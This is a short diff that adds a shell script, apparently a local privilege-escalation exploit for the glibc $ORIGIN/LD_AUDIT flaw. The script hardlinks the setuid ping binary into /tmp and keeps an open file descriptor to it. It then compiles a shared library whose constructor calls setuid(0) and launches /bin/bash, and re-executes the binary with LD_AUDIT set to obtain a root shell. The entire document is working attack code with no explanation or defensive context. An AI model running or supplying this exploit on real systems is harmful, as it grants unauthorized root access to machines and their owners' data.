@@ -1,0 +1,19 @@
+#!/bin/sh
+unset LD_AUDIT
+rm -r -f /tmp/exploit
+mkdir /tmp/exploit
+ln /bin/ping /tmp/exploit/target
+exec 3< /tmp/exploit/target
+ls -l /proc/$$/fd/3
+rm -rf /tmp/exploit
+ls -l /proc/$$/fd/3
+cat > program.c << _EOF
+void __attribute__((constructor)) init()
+{
+    setuid(0);
+    system("/bin/bash");
+}
+_EOF
+gcc -w -fPIC -shared -o /tmp/exploit program.c
+LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
+unset LD_AUDIT
